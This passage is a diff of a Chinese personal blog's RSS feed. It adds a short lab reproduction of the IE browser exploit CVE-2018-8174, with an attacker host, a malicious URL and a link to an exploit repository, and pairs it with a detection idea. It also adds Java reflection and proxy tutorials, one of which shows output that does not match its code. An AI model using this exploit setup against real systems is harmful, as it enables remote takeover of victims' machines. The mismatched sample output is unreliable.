@@ -5,9 +5,44 @@
     <description>这里是 Seal 的个人博客，与你一起发现更大的世界。</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Wed, 09 Sep 2020 21:02:24 +0800</pubDate>
-    <lastBuildDate>Wed, 09 Sep 2020 21:02:24 +0800</lastBuildDate>
+    <pubDate>Thu, 10 Sep 2020 09:24:46 +0800</pubDate>
+    <lastBuildDate>Thu, 10 Sep 2020 09:24:46 +0800</lastBuildDate>
     <generator>Jekyll v4.1.1</generator>
+    
+      <item>
+        <title>浏览器溢出攻击与检测（CVE-2018-8174）</title>
+        <description>&lt;h3 id=&quot;1背景信息&quot;&gt;1、背景信息&lt;/h3&gt;
+
+&lt;p&gt;攻击者ip：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.13&lt;/code&gt;
+恶意网址： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.1.13/exploit.html&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;受害者系统： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows7&lt;/code&gt;
+受害者浏览器：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IE8 8.0.7600.16385&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;2攻击流程&quot;&gt;2、攻击流程&lt;/h3&gt;
+&lt;p&gt;受害者访问恶意网址 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.1.13/exploit.html&lt;/code&gt;，系统即可被攻击者控制：
+&lt;img src=&quot;/img/2020-09-09-浏览器溢出攻击与检测（CVE-2018-8174）/1.gif&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;3监测思路&quot;&gt;3、监测思路&lt;/h3&gt;
+&lt;p&gt;可监测浏览器是否存在开启非预期子进程的行为，如存在此行为则可认定存在问题，测试demo如下：
+&lt;img src=&quot;/img/2020-09-09-浏览器溢出攻击与检测（CVE-2018-8174）/2-9658566.gif&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;4攻击原理&quot;&gt;4、攻击原理&lt;/h3&gt;
+&lt;p&gt;攻击者可利用缓存区溢出等漏洞，实现当用户浏览攻击者搭建的恶意网址时，直接在其电脑执行任意代码，从而实现控制其电脑的目的。&lt;/p&gt;
+
+&lt;h3 id=&quot;参考&quot;&gt;参考&lt;/h3&gt;
+&lt;p&gt;https://github.com/Sch01ar/CVE-2018-8174_EXP&lt;/p&gt;
+</description>
+        <pubDate>Wed, 09 Sep 2020 20:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2020/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E4%B8%8E%E6%A3%80%E6%B5%8B-CVE-2018-8174/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E4%B8%8E%E6%A3%80%E6%B5%8B-CVE-2018-8174/</guid>
+        
+        <category>浏览器安全</category>
+        
+        <category>漏洞复现</category>
+        
+        
+      </item>
     
       <item>
         <title>weblogic远程调试设置</title>
@@ -641,6 +676,434 @@ https://xz.aliyun.com/t/5496&lt;/p&gt;
         <category>java</category>
         
         <category>反序列化</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>java基础知识</title>
+        <description>&lt;h2 id=&quot;类&quot;&gt;类&lt;/h2&gt;
+
+&lt;p&gt;类是一个模板，它描述一类对象的行为和状态。&lt;/p&gt;
+
+&lt;h2 id=&quot;对象&quot;&gt;对象&lt;/h2&gt;
+&lt;p&gt;对象是类的一个实例（对象不是找个女朋友），有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。
+下图中男孩（boy）、女孩（girl）为类（class），而具体的每个人为该类的对象（object）：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/2020-09-09-java基础知识/object-class.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;class对象&quot;&gt;class对象&lt;/h2&gt;
+&lt;p&gt;Class代表类的实体，在运行的Java应用程序中表示类和接口。在这个类中提供了很多有用的方法，这里对他们简单的分类介绍。&lt;/p&gt;
+
+&lt;h2 id=&quot;反射&quot;&gt;反射&lt;/h2&gt;
+&lt;p&gt;JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；
+对于任意一个对象，都能够调用它的任意方法和属性；
+这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。&lt;/p&gt;
+
+&lt;h2 id=&quot;获取class对象的方法&quot;&gt;获取class对象的方法&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;根据当前对象获取class：
+    &lt;ul&gt;
+      &lt;li&gt;getClass()函数：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;对象.getClass()&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;class属性：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;对象.class&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;根据类名获取
+    &lt;ul&gt;
+      &lt;li&gt;Class.forName(类名)
+三种方法获取到的Class对象相同
+&lt;img src=&quot;/img/2020-09-09-java基础知识/getclass.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;通过class生成实例对象以及私有函数的调用&quot;&gt;通过class生成实例对象以及私有函数的调用&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;无参&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;	public user() { }
+    public int getAge() { return age; }
+    public void setAge(int age) {
+        this.age = age;
+    }
+    public String getName() {
+        return name;
+    }
+    public void setName(String name) {
+        this.name = name;
+    }
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Class us_class_3=Class.forName(&quot;user&quot;);
+Object us_obj=us_class_3.newInstance();
+user us=(user)us_obj;
+us.setAge(15);
+us.setName(&quot;lihua&quot;);
+System.out.println(us.getName());
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;输出： lihua&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;有参&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-构造函数&quot;&gt;public user(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-调用&quot;&gt;        Class us_class_3=Class.forName(&quot;user&quot;);
+        Constructor ct=us_class_3.getDeclaredConstructor(new Class[]{String.class,int.class});
+        Object us_obj=ct.newInstance(new Object[]{&quot;lihua&quot;,15});
+        user us=(user)us_obj;
+        System.out.println(us.getName());
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出： lihua&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;私有&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;user类：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;    private int getAge() {
+        this.age=15;
+        return age;
+    }
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;获取并执行：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;        Class us_class_3=Class.forName(&quot;user&quot;);
+        Method method_getAge=us_class_3.getDeclaredMethod(&quot;getAge&quot;);
+        method_getAge.setAccessible(true);
+        Object obj=method_getAge.invoke(us_class_3.newInstance());
+        System.out.println(obj);
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;输出： 15&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;other&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;user类：&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;	private int getAge() {
+        return age;
+    }
+    private void setAge(int age) {
+        this.age = age;
+    }
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;获取并执行：&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;        Class us_class_3=Class.forName(&quot;user&quot;);
+        Method method_setAge = us_class_3.getDeclaredMethod(&quot;setAge&quot;, int.class);
+        method_setAge.setAccessible(true);
+        Object obj=us_class_3.newInstance();
+        method_setAge.invoke(obj, 15);
+
+        Method method_getAge=us_class_3.getDeclaredMethod(&quot;getAge&quot;);
+        method_getAge.setAccessible(true);
+        Object obj1=method_getAge.invoke(obj);
+        System.out.println(obj1);
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;输出：15&lt;/p&gt;
+
+&lt;h2 id=&quot;序列化与反序列化&quot;&gt;序列化与反序列化&lt;/h2&gt;
+&lt;p&gt;序列化与反序列化时，我们序列化中数据包含的是哪些信息：只有对象中的属性值而已。
+Java JDK底层会先调用无参构造方法实例化，再读取序列化的字段数据赋值，所以我们没有办法将可控的字段值在实例化阶段传入构造方法中对其内部逻辑产生影响。&lt;/p&gt;
+
+&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;
+&lt;p&gt;https://www.runoob.com/java/java-object-classes.html
+https://www.jianshu.com/p/9be58ee20dee&lt;/p&gt;
+</description>
+        <pubDate>Wed, 09 Sep 2020 20:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2020/09/09/java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/09/09/java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid>
+        
+        <category>java</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>java代理模式</title>
+        <description>&lt;h1 id=&quot;代理目的&quot;&gt;代理目的&lt;/h1&gt;
+
+&lt;p&gt;代理(Proxy)可以在目标对象实现的基础上,增强额外的功能操作,即扩展目标对象的功能.&lt;/p&gt;
+
+&lt;h1 id=&quot;基本情况&quot;&gt;基本情况&lt;/h1&gt;
+
+&lt;h2 id=&quot;接口&quot;&gt;接口&lt;/h2&gt;
+
+&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HelloInterface&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sayHello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;被代理类&quot;&gt;被代理类&lt;/h2&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Hello&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HelloInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sayHello&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello lihua!&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;静态代理&quot;&gt;静态代理&lt;/h1&gt;
+
+&lt;p&gt;创建一个接口，然后创建被代理的类实现该接口并且实现该接口中的抽象方法。之后再创建一个代理类，同时使其也实现这个接口。在代理类中持有一个被代理对象的引用，而后在代理类方法中调用该对象的方法。&lt;/p&gt;
+
+&lt;h2 id=&quot;代理类&quot;&gt;代理类&lt;/h2&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HelloProxy&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HelloInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HelloInterface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;helloInterface&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Hello&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sayHello&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Before invoke sayHello&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;helloInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sayHello&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;After invoke sayHello&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;代理类的使用&quot;&gt;代理类的使用&lt;/h2&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;HelloProxy&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;helloProxy&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HelloProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;helloProxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sayHello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+&lt;span class=&quot;err&quot;&gt;输出：&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Before&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;invoke&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sayHello&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Hello&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zhanghao&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;After&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;invoke&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sayHello&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;动态代理&quot;&gt;动态代理&lt;/h1&gt;
+
+&lt;h2 id=&quot;代理类-1&quot;&gt;代理类&lt;/h2&gt;
+
+&lt;div class=&quot;language-kotlin highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ProxyHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;InvocationHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ProxyHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;= object;
+    }
+    @&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Override&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proxy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Throwable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Before invoke &quot;&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;After invoke &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
